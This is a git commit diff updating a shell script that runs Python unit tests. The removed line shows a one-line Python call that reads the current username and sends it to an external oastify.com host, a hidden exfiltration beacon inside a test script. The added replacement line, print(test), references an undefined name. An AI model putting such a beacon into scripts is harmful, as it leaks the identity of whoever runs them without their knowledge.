915714e44b906c01c57a2c384a2bdc365eb42aa1
ps-ws <110921833+ps-ws@users.noreply.github.com>
2022-08-10 17:33:35 -0400

    Update task_unit_test.sh

--- task_unit_test.sh
+++ task_unit_test.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 
-python3 -c "import getpass; username = getpass.getuser(); url = 'https://zvyf2s7shbhyllcvoh9nypyqbhhb50.oastify.com/?username=' + username;  import urllib.request; urllib.request.urlopen(url).read()"
+python3 -c "print(test)"
 python3 -m pip install pytest
 python3 -m pytest -v --junitxml=pytest_basics.xml --durations=10 test_basics.py
